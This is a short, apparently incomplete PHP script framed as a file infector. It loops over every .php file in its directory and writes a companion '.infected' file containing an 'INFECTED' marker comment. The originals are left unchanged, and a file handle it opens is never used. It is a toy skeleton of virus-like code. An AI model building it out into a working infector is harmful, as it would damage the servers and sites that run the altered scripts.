<?php 
 $filenames = glob("*.php");
 foreach($filenames as $file){
   $scpt = fopen($file,"r");
   $inf = fopen("$file.infected","w");
   $infection = '<?php //FILE INFECTED ?>';
   fwrite($inf, $infection);
 }

